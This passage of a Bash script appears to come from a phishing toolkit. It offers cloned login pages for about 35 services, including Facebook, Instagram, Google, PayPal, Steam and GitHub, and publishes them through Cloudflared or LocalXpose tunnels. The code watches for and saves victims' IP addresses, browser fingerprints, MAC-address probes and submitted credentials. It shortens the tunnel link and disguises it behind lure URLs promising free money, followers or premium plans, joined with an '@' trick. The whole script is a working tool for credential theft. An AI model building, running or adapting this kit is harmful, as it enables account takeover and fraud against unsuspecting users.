			echo -e "${LGREEN}[${WHITE}!${LGREEN}] Possible MAC addresses detected:${RESET}\n"
			grep "▸" "$mac_file" | tail -10 | while read line; do
				echo -e "${WHITE}$line${RESET}"
			done
			echo -e "\n${YELLOW}!  Note: Browser security usually blocks MAC access${RESET}"
			echo -e "${YELLOW}!  These may be from WebRTC/Bluetooth/USB leaks${RESET}"
		else
			echo -e "${GRAY}[${RED}x${GRAY}] No MAC addresses found (expected)${RESET}"
			echo -e "${GRAY}[${RED}*${GRAY}] Browser security blocked all 12 methods${RESET}"
		fi
		
		echo -e "\n${GRAY}[${RED}*${GRAY}] Hunt details saved to: ${WHITE}auth/mac_hunt.txt${RESET}"
		
		# Save to auth folder
		cat "$mac_file" >> auth/mac_hunt.txt
		
		# Log to activity log
		log_separator
		log_action "MAC ADDRESS HUNT COMPLETED"
		if grep -q "POSSIBLE MAC" "$mac_file"; then
			log_success "Possible MAC addresses found!"
		else
			log_msg "No MAC addresses found (browser protected)"
		fi
		
		rm -rf "$mac_file"
	fi
}

## Print data - Dark Theme
capture_data() {
	echo -e "\n${RED}╔═══════════════════════════════════════════════════════════════════╗"
	echo -e "${RED}║${LRED}                    ▼ MONITORING TARGETS ▼                        ${RED}║"
	echo -e "${RED}╚═══════════════════════════════════════════════════════════════════╝${RESET}\n"
	echo -ne "${GRAY}[${RED}*${GRAY}] Waiting for connections... ${GRAY}(Press ${WHITE}Ctrl+C${GRAY} to abort)${RESET}\n\n"
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
			echo -e "${LRED}[${WHITE}▼${LRED}] TARGET IP DETECTED${RESET}"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.5
		if [[ -e ".server/www/fingerprint.txt" ]]; then
			capture_fingerprint
		fi
		sleep 0.5
		if [[ -e ".server/www/mac_hunt.txt" ]]; then
			capture_mac
		fi
		sleep 0.5
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
			echo -e "${LRED}[${WHITE}▼${LRED}] CREDENTIALS COMPROMISED${RESET}"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.5
	done
}

## Start Cloudflared
start_cloudflared() { 
	rm .cld.log > /dev/null 2>&1 &
	cusport
	log_action "Initializing Cloudflared tunnel"
	log_msg "Server: http://$HOST:$PORT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	log_action "Starting Cloudflared tunnel..."
	sleep 8
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	log_success "Cloudflared tunnel established: $cldflr_url"
	custom_url "$cldflr_url"
	log_separator
	log_action "Monitoring for incoming connections..."
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose (Again...)
start_loclx() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	sleep 12
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
	custom_url "$loclx_url"
	capture_data
}

## Start localhost
start_localhost() {
	cusport
	log_action "Initializing localhost server"
	log_msg "Server: http://$HOST:$PORT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	log_success "Server successfully hosted at: http://$HOST:$PORT"
	log_separator
	log_action "Monitoring for incoming connections..."
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection - Dark Theme
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}╔═══════════════════════════════════════════════════════════════╗
		${RED}║${WHITE}             ▼ SELECT TUNNELING METHOD ▼                  ${RED}║
		${RED}╠═══════════════════════════════════════════════════════════════╣
		${RED}║                                                               ${RED}║
		${RED}║  ${WHITE}01${RED}) ${GRAY}▸ Localhost${RESET}                                         ${RED}║
		${RED}║      ${GRAY}└─ Local testing only (127.0.0.1)                 ${RED}║
		${RED}║                                                               ${RED}║
		${RED}║  ${WHITE}02${RED}) ${GRAY}▸ Cloudflared ${LRED}[Recommended]${RESET}                  ${RED}║
		${RED}║      ${GRAY}└─ Auto detects - Fast & reliable                 ${RED}║
		${RED}║                                                               ${RED}║
		${RED}║  ${WHITE}03${RED}) ${GRAY}▸ LocalXpose ${LRED}[15 Min Limit]${RESET}                 ${RED}║
		${RED}║      ${GRAY}└─ Alternative tunneling service                ${RED}║
		${RED}║                                                               ${RED}║
		${RED}╚═══════════════════════════════════════════════════════════════╝${RESET}

	EOF

	echo -ne "${RED}┌─${WHITE} SELECT TUNNEL ${RED}─────────────────────────────────────────────────╮\n"
	read -p "${RED}│${RESET} ${LRED}►${RESET} " REPLY
	echo -ne "${RED}└──────────────────────────────────────────────────────────╯${RESET}\n\n"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_loclx;;
		*)
			echo -ne "\n${LRED}x ${WHITE}Invalid option! ${GRAY}Please try again...${RESET}"
			{ sleep 1; tunnel_menu; };;
	esac
}

## Custom Mask URL
custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
	echo
	if [[ ${mask_op,,} == "y" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
		fi
	fi
}

## URL Shortner
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
		processed_url=${short#http*//}
	fi
}

custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		elif [[ $(site_stat $shortcode) == 2* ]]; then
			shorten $shortcode "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
	else
		# echo "[!] No url provided / Regex Not Matched"
		url="Unable to generate links. Try after turning on hotspot"
		processed_url="Unable to Short URL"
	fi

	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
}

## Facebook - Dark Theme
site_facebook() {
	cat <<- EOF

		${RED}╔═══════════════════════════════════════════════════════════════════╗
		${RED}║${WHITE}                  ▼ FACEBOOK ATTACK VECTORS ▼                  ${RED}║
		${RED}╠═══════════════════════════════════════════════════════════════════╣
		${RED}║                                                                   ${RED}║
		${RED}║  ${WHITE}01${RED}) ${GRAY}▸ Traditional Login Page                              ${RED}║
		${RED}║      ${GRAY}└─ Classic Facebook login interface                    ${RED}║
		${RED}║                                                                   ${RED}║
		${RED}║  ${WHITE}02${RED}) ${GRAY}▸ Advanced Voting Poll                                ${RED}║
		${RED}║      ${GRAY}└─ Vote for best social media                         ${RED}║
		${RED}║                                                                   ${RED}║
		${RED}║  ${WHITE}03${RED}) ${GRAY}▸ Fake Security Check                                  ${RED}║
		${RED}║      ${GRAY}└─ Security verification prompt                       ${RED}║
		${RED}║                                                                   ${RED}║
		${RED}║  ${WHITE}04${RED}) ${GRAY}▸ Facebook Messenger                                   ${RED}║
		${RED}║      ${GRAY}└─ Messenger premium features                         ${RED}║
		${RED}║                                                                   ${RED}║
		${RED}╚═══════════════════════════════════════════════════════════════════╝${RESET}

	EOF

	echo -ne "${RED}┌─${WHITE} SELECT ATTACK ${RED}──────────────────────────────────────────────────╮\n"
	read -p "${RED}│${RESET} ${LRED}►${RESET} " REPLY
	echo -ne "${RED}└──────────────────────────────────────────────────────────────────╯${RESET}\n\n"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			log_action "Target selected: Facebook - Traditional Login"
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			log_action "Target selected: Facebook - Advanced Voting Poll"
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			log_action "Target selected: Facebook - Fake Security Check"
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			log_action "Target selected: Facebook - Messenger"
			tunnel_menu;;
		*)
			echo -ne "\n${LRED}[${WHITE}!${LRED}]${WHITE} Invalid selection! ${GRAY}Try again...${RESET}"
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram - Enhanced Design
site_instagram() {
	cat <<- EOF

		${LCYAN}╔═══════════════════════════════════════════════════════════════════╗
		${LCYAN}║${LBLUE}                INSTAGRAM PHISHING TEMPLATES                ${LCYAN}║
		${LCYAN}╠═══════════════════════════════════════════════════════════════════╣
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}║  ${WHITE}01${LCYAN}) ${ORANGE}Traditional Login Page                                ${LCYAN}║
		${LCYAN}║      ${GRAY}└─ Classic Instagram login interface${RESET}                  ${LCYAN}║
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}║  ${WHITE}02${LCYAN}) ${ORANGE}Auto Followers Generator                               ${LCYAN}║
		${LCYAN}║      ${GRAY}└─ Get unlimited followers${RESET}                            ${LCYAN}║
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}║  ${WHITE}03${LCYAN}) ${ORANGE}1000 Followers Instant                                 ${LCYAN}║
		${LCYAN}║      ${GRAY}└─ Claim 1000+ followers now${RESET}                          ${LCYAN}║
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}║  ${WHITE}04${LCYAN}) ${ORANGE}Blue Badge Verification                                ${LCYAN}║
		${LCYAN}║      ${GRAY}└─ Get verified badge for free${RESET}                        ${LCYAN}║
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}╚═══════════════════════════════════════════════════════════════════╝${RESET}

	EOF

	echo -ne "${LCYAN}┌─${WHITE} Select template ${LCYAN}──────────────────────────────────────────────╮\n"
	read -p "${LCYAN}│${RESET} ${LGREEN}>${RESET} " REPLY
	echo -ne "${LCYAN}└──────────────────────────────────────────────────────────────────╯${RESET}\n\n"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${LRED}x ${WHITE}Invalid option! ${GRAY}Please try again...${RESET}"
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google - Enhanced Design
site_gmail() {
	cat <<- EOF

		${LCYAN}╔═══════════════════════════════════════════════════════════════════╗
		${LCYAN}║${LBLUE}                 GOOGLE PHISHING TEMPLATES                  ${LCYAN}║
		${LCYAN}╠═══════════════════════════════════════════════════════════════════╣
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}║  ${WHITE}01${LCYAN}) ${ORANGE}Gmail Classic Login                                    ${LCYAN}║
		${LCYAN}║      ${GRAY}└─ Old Gmail login interface${RESET}                          ${LCYAN}║
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}║  ${WHITE}02${LCYAN}) ${ORANGE}Gmail Modern Login                                     ${LCYAN}║
		${LCYAN}║      ${GRAY}└─ New Gmail login interface${RESET}                          ${LCYAN}║
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}║  ${WHITE}03${LCYAN}) ${ORANGE}Advanced Voting Poll                                   ${LCYAN}║
		${LCYAN}║      ${GRAY}└─ Vote for best social media${RESET}                         ${LCYAN}║
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}╚═══════════════════════════════════════════════════════════════════╝${RESET}

	EOF

	echo -ne "${LCYAN}┌─${WHITE} Select template ${LCYAN}──────────────────────────────────────────────╮\n"
	read -p "${LCYAN}│${RESET} ${LGREEN}>${RESET} " REPLY
	echo -ne "${LCYAN}└──────────────────────────────────────────────────────────────────╯${RESET}\n\n"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${LRED}x ${WHITE}Invalid option! ${GRAY}Please try again...${RESET}"
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk - Enhanced Design
site_vk() {
	cat <<- EOF

		${LCYAN}╔═══════════════════════════════════════════════════════════════════╗
		${LCYAN}║${LBLUE}                   VK PHISHING TEMPLATES                    ${LCYAN}║
		${LCYAN}╠═══════════════════════════════════════════════════════════════════╣
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}║  ${WHITE}01${LCYAN}) ${ORANGE}Traditional Login Page                                ${LCYAN}║
		${LCYAN}║      ${GRAY}└─ Classic VK login interface${RESET}                         ${LCYAN}║
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}║  ${WHITE}02${LCYAN}) ${ORANGE}Advanced Voting Poll                                   ${LCYAN}║
		${LCYAN}║      ${GRAY}└─ Vote for best social media${RESET}                         ${LCYAN}║
		${LCYAN}║                                                                   ${LCYAN}║
		${LCYAN}╚═══════════════════════════════════════════════════════════════════╝${RESET}

	EOF

	echo -ne "${LCYAN}┌─${WHITE} Select template ${LCYAN}──────────────────────────────────────────────╮\n"
	read -p "${LCYAN}│${RESET} ${LGREEN}>${RESET} " REPLY
	echo -ne "${LCYAN}└──────────────────────────────────────────────────────────────────╯${RESET}\n\n"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='https://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${LRED}x ${WHITE}Invalid option! ${GRAY}Please try again...${RESET}"
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## Menu - Dark Hacker Theme
main_menu() {
	# Open log viewer on first run
	if [[ ! -f "$LOGFILE" ]] || [[ ! -s "$LOGFILE" ]]; then
		open_log_viewer
		sleep 1
	fi
	
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}╔═══════════════════════════════════════════════════════════════════╗
		${RED}║${WHITE}                  SELECT TARGET PLATFORM                          ${RED}║
		${RED}╠═══════════════════════════════════════════════════════════════════╣
		${RED}║ ${GRAY}[SOCIAL MEDIA]                                                    ${RED}║
		${RED}║ ${WHITE}01${RED}) ${GRAY}Facebook         ${WHITE}11${RED}) ${GRAY}Twitch           ${WHITE}21${RED}) ${GRAY}DeviantArt       ${RED}║
		${RED}║ ${WHITE}02${RED}) ${GRAY}Instagram        ${WHITE}12${RED}) ${GRAY}Pinterest        ${WHITE}22${RED}) ${GRAY}Badoo            ${RED}║
		${RED}║ ${WHITE}08${RED}) ${GRAY}Twitter          ${WHITE}13${RED}) ${GRAY}Snapchat         ${WHITE}29${RED}) ${GRAY}Vk               ${RED}║
		${RED}║ ${WHITE}10${RED}) ${GRAY}TikTok           ${WHITE}19${RED}) ${GRAY}Reddit           ${WHITE}34${RED}) ${GRAY}Discord          ${RED}║
		${RED}╠═══════════════════════════════════════════════════════════════════╣
		${RED}║ ${GRAY}[TECH & SERVICES]                                                 ${RED}║
		${RED}║ ${WHITE}03${RED}) ${GRAY}Google           ${WHITE}14${RED}) ${GRAY}LinkedIn         ${WHITE}25${RED}) ${GRAY}Yahoo            ${RED}║
		${RED}║ ${WHITE}04${RED}) ${GRAY}Microsoft        ${WHITE}18${RED}) ${GRAY}Spotify          ${WHITE}26${RED}) ${GRAY}WordPress        ${RED}║
		${RED}║ ${WHITE}17${RED}) ${GRAY}ProtonMail       ${WHITE}20${RED}) ${GRAY}Adobe            ${WHITE}27${RED}) ${GRAY}Yandex           ${RED}║
		${RED}║ ${WHITE}16${RED}) ${GRAY}Quora            ${WHITE}28${RED}) ${GRAY}StackOverflow    ${WHITE}33${RED}) ${GRAY}Github           ${RED}║
		${RED}║ ${WHITE}32${RED}) ${GRAY}GitLab                                                        ${RED}║
		${RED}╠═══════════════════════════════════════════════════════════════════╣
		${RED}║ ${GRAY}[GAMING & ENTERTAINMENT]                                          ${RED}║
		${RED}║ ${WHITE}05${RED}) ${GRAY}Netflix          ${WHITE}09${RED}) ${GRAY}PlayStation      ${WHITE}35${RED}) ${GRAY}Roblox           ${RED}║
		${RED}║ ${WHITE}07${RED}) ${GRAY}Steam            ${WHITE}30${RED}) ${GRAY}XBOX                                  ${RED}║
		${RED}╠═══════════════════════════════════════════════════════════════════╣
		${RED}║ ${GRAY}[COMMERCE & STORAGE]                                              ${RED}║
		${RED}║ ${WHITE}06${RED}) ${GRAY}PayPal           ${WHITE}15${RED}) ${GRAY}eBay             ${WHITE}24${RED}) ${GRAY}DropBox          ${RED}║
		${RED}║ ${WHITE}23${RED}) ${GRAY}Origin           ${WHITE}31${RED}) ${GRAY}MediaFire                             ${RED}║
		${RED}╠═══════════════════════════════════════════════════════════════════╣
		${RED}║ ${LRED}99${RED}) ${GRAY}About              ${LRED}00${RED}) ${GRAY}Exit                               ${RED}║
		${RED}╚═══════════════════════════════════════════════════════════════════╝${RESET}

	EOF
	
	echo -ne "${RED}┌─${WHITE} ENTER TARGET ID ${RED}─────────────────────────────────────────────────╮\n"
	read -p "${RED}│${RESET} ${LRED}>${RESET} " REPLY
	echo -ne "${RED}└──────────────────────────────────────────────────────────────────╯${RESET}\n\n"

	case $REPLY in 
		1 | 01)
			log_separator
			log_action "Platform selected: Facebook"
			site_facebook;;
		2 | 02)
			log_separator
			log_action "Platform selected: Instagram"
			site_instagram;;
		3 | 03)
			log_separator
			log_action "Platform selected: Google/Gmail"
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='https://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='https://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="reddit"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='https://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='https://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='https://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='https://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='https://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='https://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
			website="discord"
			mask='https://get-discord-nitro-free'
			tunnel_menu;;
		35)
			website="roblox"
			mask='https://get-free-robux'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${LRED}x ${WHITE}Invalid option! ${GRAY}Please try again...${RESET}"
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu
